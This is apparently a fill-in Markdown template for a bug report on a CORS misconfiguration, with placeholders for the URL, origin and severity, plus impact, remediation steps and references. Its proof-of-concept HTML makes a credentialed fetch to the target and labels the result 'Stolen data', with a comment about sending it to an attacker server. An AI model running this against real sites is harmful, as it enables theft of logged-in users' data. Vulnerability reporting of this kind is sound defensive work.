# {title}

**Vulnerability Type:** Cross-Origin Resource Sharing (CORS) Misconfiguration  
**Severity:** {severity}  
**Date:** {date}

## Summary
A CORS misconfiguration was discovered that allows unauthorized cross-origin requests from potentially malicious domains.

## Vulnerable Endpoint
- **URL:** `{url}`
- **Malicious Origin:** `{origin}`

## Proof of Concept

### Steps to Reproduce
1. Create a malicious webpage hosted on `{origin}`
2. Make an AJAX request to: `{url}`
3. Observe that the request is successful and credentials are included

### Example Malicious Code
```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <script>
        fetch('{url}', {{
            method: 'GET',
            credentials: 'include'
        }})
        .then(response => response.text())
        .then(data => {{
            console.log('Stolen data:', data);
            // Send data to attacker server
        }})
        .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
```

### Expected Response Headers
```http
Access-Control-Allow-Origin: {origin}
Access-Control-Allow-Credentials: true
```

## Impact
- Sensitive data theft from authenticated users
- Cross-site request forgery (CSRF) attacks
- Session hijacking
- Unauthorized API access

## Risk Rating
**{severity}** - CORS misconfiguration can lead to unauthorized access to sensitive user data.

## Remediation
1. Implement a strict whitelist of allowed origins
2. Avoid using wildcards (*) with credentials
3. Validate Origin headers server-side
4. Use proper CORS middleware/libraries
5. Implement SameSite cookie attributes
6. Regular security audits of CORS configurations

## References
- [OWASP CORS Security Cheat Sheet](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Origin_Resource_Sharing_Cheat_Sheet.html)
- [MDN CORS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)